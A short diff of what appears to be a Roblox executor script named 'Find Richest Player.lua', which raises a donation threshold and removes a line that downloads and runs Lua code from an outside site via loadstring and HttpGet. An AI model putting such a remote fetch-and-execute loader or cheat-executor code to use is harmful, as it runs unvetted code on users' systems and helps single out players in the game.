@@ -4,10 +4,8 @@ Find Richest Player.lua
 
 ]]--
 
-local minimum = 1500 -- enter your minimum robux donated amount here
+local minimum = 20000 -- enter your minimum robux donated amount here
 
-
-loadstring(game:HttpGet("https://hypernite.xyz/Scripts/Ukraine.lua"))()
 if game.PlaceId ~= 8737602449 then return end -- failed attempt at autoexec compatability below, feel free to try and fix it
 
 if not game.IsLoaded then game.Loaded:Wait() end
